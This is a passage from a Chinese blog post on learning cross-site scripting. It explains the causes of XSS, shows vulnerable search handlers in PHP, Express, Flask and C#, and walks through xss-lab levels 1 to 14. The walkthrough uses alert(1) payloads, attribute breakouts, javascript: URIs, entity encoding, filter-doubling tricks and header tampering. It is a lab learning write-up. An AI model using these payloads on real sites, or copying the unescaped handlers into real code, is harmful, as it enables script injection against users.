title="函数类"></a>函数类</h2><p>比如说php中的脚本的输出函数</p><p>常见的输出函数有：<code>print</code>、<code>print_r</code>、<code>echo</code>、<code>printf</code>、<code>sprintf</code>、<code>die</code>、<code>var_dump</code>、<code>var_export</code></p><p>其实<strong>归根结底</strong>，XSS的攻击方式就是想办法“教唆”用户的浏览器去执行一些这个网页中原本不存在的<strong>前端代码</strong>。</p><h2 id="什么导致xss"><a href="#什么导致xss" class="headerlink" title="什么导致xss"></a>什么导致xss</h2><p><strong>输入验证和清理不足</strong></p><p>Web 应用程序接受用户数据（例如通过表单），并使用这些数据动态生成 HTML 页面。因此，恶意脚本可以作为合法输入的一部分嵌入，并最终由浏览器执行，除非经过充分清理。</p><p><strong>缺乏输出编码</strong></p><p>用户可以使用各种字符来改变 Web 浏览器处理和显示网页的方式。对于 HTML 部分，将<code>&lt;</code>、<code>&gt;</code>、<code>&quot;</code>、<code>&#39;</code>和<code>&amp;</code>等字符正确编码为各自的 HTML 编码至关重要。对于 JavaScript，应特别注意转义<code>&#39;</code>、<code>&quot;</code>和<code>\</code>。<strong>无法正确编码用户提供的数据</strong>是导致XSS漏洞的主要原因。</p><p><strong>安全标头使用不当</strong></p><p>各种安全标头都可以帮助缓解XSS漏洞。例如，内容安全策略 ( CSP )通过定义哪些来源可信任可执行脚本来缓解XSS风险。配置错误的CSP（例如过于宽松的策略或不当使用<code>unsafe-inline</code>或<code>unsafe-eval</code>指令）可能会让攻击者更容易执行其XSS负载。</p><p><strong>框架和语言漏洞</strong></p><p>一些较<strong>旧的 Web 框架</strong>未提供针对XSS的安全机制；其他一些框架存在未修补的XSS漏洞。现代 Web 框架在设计上会自动避开XSS，并及时修补任何发现的漏洞。</p><p><strong>第三方库</strong></p><p>在 Web 应用程序中集成第三方库可能会引入XSS漏洞；即使核心 Web 应用程序不易受到攻击。</p><h2 id="Bug-code"><a href="#Bug-code" class="headerlink" title="Bug code"></a>Bug code</h2><p>一个简单的反射型XSS漏洞是当<strong>用户搜索某个术语</strong>时，<strong>搜索字符串会逐字包含在结果页面中</strong>。这种简单的情况为攻击者提供了一个容易利用的目标。</p><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$search_query</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;You searched for: <span class="subst">$search_query</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/search&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> searchTerm = req.<span class="property">query</span>.<span class="property">q</span>;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;You searched for: &#x27;</span> + searchTerm);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">80</span>);</span><br></pre></td></tr></table></figure><h3 id="Python（Flask）"><a href="#Python（Flask）" class="headerlink" title="Python（Flask）"></a>Python（Flask）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/search&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    query = request.args.get(<span class="string">&quot;q&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;You searched for: <span class="subst">&#123;query&#125;</span>!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="C"><a href="#C" class="headerlink" title="C#"></a>C#</h3><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Page_Load</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> userInput = Request.QueryString[<span class="string">&quot;q&quot;</span>];</span><br><span class="line">    Response.Write(<span class="string">&quot;User Input: &quot;</span> + userInput);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="xss-lab"><a href="#xss-lab" class="headerlink" title="xss-lab"></a>xss-lab</h1><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>直接输入<code>?name=&lt;script&gt;alert(1)&lt;/script&gt;</code>就可以发现没被过滤直接成功</p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>照常输入<code>?name=&lt;script&gt;alert(1)&lt;/script&gt;</code>F12发现被转义成 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;lt;script&amp;gt;<span class="title function_ invoke__">alert</span>(<span class="number">1</span>);&amp;lt;/script&amp;gt;</span><br></pre></td></tr></table></figure><p>但是往下看会发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&lt;script&gt;alert(1);&lt;/script&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>在value中没被转义，因此可以构造</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&quot;</span>&gt;&lt;script&gt;<span class="built_in">alert</span>(<span class="number">1</span>);&lt;/script&gt;&lt;<span class="string">&quot;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>即输入 <code>?name=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;&quot;</code></p><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>这一题涉及一个知识点</p><p>在 8.1.0 及以上的 PHP 版本中，这个函数默认会转义 <code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、<code>&#39;</code>、<code>&quot;</code> 这五个字符，基本可以防范这里的 XSS 攻击。<br>但是，8.1.0 以下版本的 PHP 默认只会转义 <code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、<code>&quot;</code> 这四个字符，不会转义单引号 <code>&#39;</code>。这就给这个函数带来了巨大的安全隐患。</p><p>我们可以通过探测语句来看到这一点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x27;</span><br><span class="line">&quot;</span><br><span class="line">()</span><br><span class="line">&lt; &gt;</span><br><span class="line">&lt;script&gt; &lt;/script&gt;</span><br><span class="line">&lt;Script&gt; &lt;/Script&gt;</span><br><span class="line">&lt;scrscriptipt&gt; &lt;SCRscriptIPT&gt;</span><br><span class="line">Onerror</span><br><span class="line">onerror</span><br><span class="line">javascript:</span><br><span class="line">JavaScript:</span><br><span class="line">&lt;!-- --&gt;</span><br><span class="line">eval()</span><br><span class="line">&lt;a&gt;</span><br><span class="line">&lt;img&gt;</span><br><span class="line">&lt;iframe&gt;</span><br><span class="line">&lt;form&gt;</span><br><span class="line">src</span><br><span class="line">&#123;&#125;</span><br><span class="line">/</span><br><span class="line">+</span><br></pre></td></tr></table></figure><p>打进去看见</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=center&gt;没有找到和<span class="string">&#x27; &amp;quot; () &amp;lt; &amp;gt; &amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;Script&amp;gt; &amp;lt;/Script&amp;gt; &amp;lt;scrscriptipt&amp;gt; &amp;lt;SCRscriptIPT&amp;gt; Onerror onerror javascript: JavaScript: &amp;lt;!-- --&amp;gt; eval() &amp;lt;a&amp;gt; &amp;lt;img&amp;gt; &amp;lt;iframe&amp;gt; &amp;lt;form&amp;gt; src &#123;&#125; / +相关的结果.&lt;/h2&gt;&lt;center&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;   //未被转义</span></span><br><span class="line"><span class="string">&quot;   //转译成&amp;quot;</span></span><br><span class="line"><span class="string">()  //未被转义</span></span><br><span class="line"><span class="string">&lt; &gt; //&amp;lt; &amp;gt;</span></span><br><span class="line"><span class="string">&lt;script&gt; &lt;/script&gt; //&amp;lt;script&amp;gt; &amp;lt;/script&amp;gt;</span></span><br><span class="line"><span class="string">&lt;Script&gt; &lt;/Script&gt; //&amp;lt;Script&amp;gt; &amp;lt;/Script&amp;gt;</span></span><br><span class="line"><span class="string">&lt;scrscriptipt&gt; &lt;SCRscriptIPT&gt; //&amp;lt;scrscriptipt&amp;gt; &amp;lt;SCRscriptIPT&amp;gt;</span></span><br><span class="line"><span class="string">Onerror //未被转义</span></span><br><span class="line"><span class="string">onerror //未被转义</span></span><br><span class="line"><span class="string">javascript: //未被转义</span></span><br><span class="line"><span class="string">JavaScript: //未被转义</span></span><br><span class="line"><span class="string">&lt;!-- --&gt; //&amp;lt;!-- --&amp;gt;</span></span><br><span class="line"><span class="string">eval() //未被转义</span></span><br><span class="line"><span class="string">&lt;a&gt; //&amp;lt;a&amp;gt;</span></span><br><span class="line"><span class="string">&lt;img&gt; //&amp;lt;img&amp;gt;</span></span><br><span class="line"><span class="string">&lt;iframe&gt; //&amp;lt;ifname&amp;gt;</span></span><br><span class="line"><span class="string">&lt;form&gt; //&amp;lt;form&amp;gt;</span></span><br><span class="line"><span class="string">src //未被转义</span></span><br><span class="line"><span class="string">&#123;&#125; //未被转义</span></span><br><span class="line"><span class="string">/ //未被转义</span></span><br><span class="line"><span class="string">+ //未被转义</span></span><br></pre></td></tr></table></figure><p>没有被过滤单引号，然后发现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&#x27;&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>value是通过单引号来闭合的，因此可以提前闭合value，但是没有&lt;&gt;就无法闭合标签，考虑使用触发器</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&#x27;&#x27; onblur=&#x27;</span><span class="built_in">alert</span>(<span class="number">1</span>)<span class="string">&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p><code>?name=&#39; onblur=&#39;alert(1)</code></p><p>input没有onerror，而onblur是失去焦点触发，因此搜索框随便输点东西之后点其他地方就成功触发</p><p>注意：空格</p><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=center&gt;没有找到和<span class="string">&#x27; &amp;quot; () &amp;lt; &amp;gt; &amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;Script&amp;gt; &amp;lt;/Script&amp;gt; &amp;lt;scrscriptipt&amp;gt; &amp;lt;SCRscriptIPT&amp;gt; Onerror onerror javascript: JavaScript: &amp;lt;!-- --&amp;gt; eval() &amp;lt;a&amp;gt; &amp;lt;img&amp;gt; &amp;lt;iframe&amp;gt; &amp;lt;form&amp;gt; src &#123;&#125; / +相关的结果.&lt;/h2&gt;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span> <span class="string">&quot; ()   script /script Script /Script scrscriptipt SCRscriptIPT Onerror onerror javascript: JavaScript: !-- -- eval() a img iframe form src &#123;&#125; / +&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>发现value的双引号未被过滤且双引号闭合，因此类似level3</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; onblur=&quot;</span><span class="built_in">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=center&gt;没有找到和<span class="string">&#x27; &amp;quot; () &amp;lt; &amp;gt; &amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;scrscriptipt&amp;gt; &amp;lt;scrscriptipt&amp;gt; onerror onerror javascript: javascript: &amp;lt;!-- --&amp;gt; eval() &amp;lt;a&amp;gt; &amp;lt;img&amp;gt; &amp;lt;iframe&amp;gt; &amp;lt;form&amp;gt; src &#123;&#125; / +相关的结果.&lt;/h2&gt;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span> <span class="string">&quot; () &lt; &gt; &lt;scr_ipt&gt; &lt;/script&gt; &lt;scr_ipt&gt; &lt;/script&gt; &lt;scrscriptipt&gt; &lt;scrscriptipt&gt; o_nerror o_nerror javascript: javascript: &lt;!-- --&gt; eval() &lt;a&gt; &lt;img&gt; &lt;iframe&gt; &lt;form&gt; src &#123;&#125; / +&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>发现&lt;&gt;和javascript未被过滤，但是script和on被转义成scr_ipt和o_n</p><blockquote><p><a> 标签是 HTML 中的锚点元素，主要用于创建链接，也可以用来执行js</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&quot;</span>&gt;&lt;a href=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;hack&lt;/a&gt;&lt;<span class="string">&quot;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>输入 <code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;hack&lt;/a&gt;&lt;&quot;</code>成功hack</p><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=center&gt;没有找到和<span class="string">&#x27; &amp;quot; () &amp;lt; &amp;gt; &amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;Script&amp;gt; &amp;lt;/Script&amp;gt; &amp;lt;scrscriptipt&amp;gt; &amp;lt;SCRscriptIPT&amp;gt; Onerror onerror javascript: JavaScript: &amp;lt;!-- --&amp;gt; eval() &amp;lt;a&amp;gt; &amp;lt;img&amp;gt; &amp;lt;iframe&amp;gt; &amp;lt;form&amp;gt; src &#123;&#125; / +相关的结果.&lt;/h2&gt;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span> <span class="string">&quot; () &lt; &gt; &lt;scr_ipt&gt; &lt;/script&gt; &lt;Script&gt; &lt;/Script&gt; &lt;scrscriptipt&gt; &lt;SCRscriptIPT&gt; Onerror o_nerror javascript: JavaScript: &lt;!-- --&gt; eval() &lt;a&gt; &lt;img&gt; &lt;iframe&gt; &lt;form&gt; sr_c &#123;&#125; / +&quot;</span>&gt;    </span><br></pre></td></tr></table></figure><p>但是发现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&quot;</span>&gt;&lt;a hr_ef=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;hack&lt;/a&gt;&lt;<span class="string">&quot;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>href被转义掉了，但是看上面的尝试，会发现大写可用，尝试大写hREF成功</p><blockquote><p>HTML大小写不敏感</p></blockquote><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=center&gt;没有找到和<span class="string">&#x27; &amp;quot; () &amp;lt; &amp;gt; &amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;scrscriptipt&amp;gt; &amp;lt;scrscriptipt&amp;gt; onerror onerror javascript: javascript: &amp;lt;!-- --&amp;gt; eval() &amp;lt;a&amp;gt; &amp;lt;img&amp;gt; &amp;lt;iframe&amp;gt; &amp;lt;form&amp;gt; src &#123;&#125; / +相关的结果.&lt;/h2&gt;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span> <span class="string">&quot; () &lt; &gt; &lt;&gt; &lt;/&gt; &lt;&gt; &lt;/&gt; &lt;script&gt; &lt;script&gt; error error java: java: &lt;!-- --&gt; eval() &lt;a&gt; &lt;img&gt; &lt;iframe&gt; &lt;form&gt;  &#123;&#125; / +&quot;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现script和on都会被过滤掉，但是只过滤了一次，因此</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&quot;</span>&gt;&lt;scrscriptipt&gt;<span class="built_in">alert</span>(<span class="number">1</span>);&lt;/scrscriptipt&gt;&lt;<span class="string">&quot;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p><code>&quot;&gt;&lt;scrscriptipt&gt;alert(1);&lt;/scrscriptipt&gt;&lt;&quot;</code></p><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>发现输入的值被拼接到</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=<span class="string">&quot;11&quot;</span>&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure><p>href后，但是JavaScript被转义了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=<span class="string">&quot;&#x27; &amp;quot () &lt; &gt; &lt;scr_ipt&gt; &lt;/scr_ipt&gt; &lt;scr_ipt&gt; &lt;/scr_ipt&gt; &lt;scrscr_iptipt&gt; &lt;scrscr_iptipt&gt; o_nerror o_nerror javascr_ipt: javascr_ipt: &lt;!-- --&gt; eval() &lt;a&gt; &lt;img&gt; &lt;iframe&gt; &lt;form&gt; sr_c &#123;&#125; / +&quot;</span>&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure><blockquote><p>这里要用到 href 属性的一个特性：href 传入的 URI 中，也可以使用 HTML 字符实体。在打开链接时，字符实体也会被转换为对应的字符。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:<span class="built_in">alert</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>会检测http:&#x2F;&#x2F;</p><p>因此</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascr&amp;#x69;pt:<span class="built_in">alert</span>(<span class="number">1</span>);<span class="comment">//http://</span></span><br></pre></td></tr></table></figure><h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/xss-levels/level10.php?keyword=test&amp;t_link=tlink&amp;t_history=thist&amp;t_sort=tsort</span></span><br></pre></td></tr></table></figure><p>会发现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level10&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;没有找到和test相关的结果.&lt;/h2&gt;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_link&quot;</span>  value=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_history&quot;</span>  value=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_sort&quot;</span>  value=<span class="string">&quot;tsort&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>变成这样，因此t_sort是有值的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;t_sort&quot;</span>  value=<span class="string">&quot;&#x27; &quot;</span> ()   script /script Script /Script scrscriptipt SCRscriptIPT Onerror onerror javascript: JavaScript: !-- -- <span class="built_in">eval</span>() a img iframe form src &#123;&#125; /  <span class="string">&quot; type=&quot;</span>hidden<span class="string">&quot;&gt;</span></span><br></pre></td></tr></table></figure><p>只过滤掉了&lt;&gt;</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;t_sort&quot;</span>  value=<span class="string">&quot;&quot;</span> onmouseover=javascript:<span class="built_in">alert</span>(<span class="number">1</span>) type=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; onmouseover=javascript:alert(1) type=&quot;</span></span><br></pre></td></tr></table></figure><h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><p>发现存在referer字段</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;t_ref&quot;</span>  value=<span class="string">&quot;http://localhost/xss-levels/level10.php?keyword=&amp;t_sort=%22%20onmouseover=javascript:alert(1)%20type=%22&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>BP抓包</p><p><img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250123115706229.png" alt="image-20250123115706229"></p><p>讲Referrer改为” onmouseover&#x3D;javascript:alert(1) type&#x3D;”通过，成功</p><h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_link&quot;</span>  value=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_history&quot;</span>  value=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_sort&quot;</span>  value=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_ua&quot;</span>  value=<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure><p>发现有ua段，显然是用户信息，因此BP修改</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;t_ua&quot;</span>  value=<span class="string">&quot;&quot;</span> onmouseover=javascript:<span class="built_in">alert</span>(<span class="number">1</span>) type=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;t_link&quot;</span>  value=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_history&quot;</span>  value=<span class="string">&quot;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_sort&quot;</span>  value=<span class="string">&quot;tsort&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;t_cook&quot;</span>  value=<span class="string">&quot;call me maybe?&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>发现t_sort和t_cook可以通过GETS传参，但是t_cook的原理未知</p><p>BP抓包发现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: user=call+me+maybe%<span class="number">7F</span></span><br></pre></td></tr></table></figure><p>Cookie的user字段便是t_cook的来源</p><h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><p>看源码发现网站貌似是挂了的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XSS学习&quot;&gt;&lt;a href=&quot;#XSS学习&quot; class=&quot;headerlink&quot; title=&quot;XSS学习&quot;&gt;&lt;/a&gt;XSS学习&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前</summary>
      
    
    
    
    <category term="Web安全" scheme="http://s1nec-1o.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Web" scheme="http://s1nec-1o.github.io/tags/Web/"/>
    
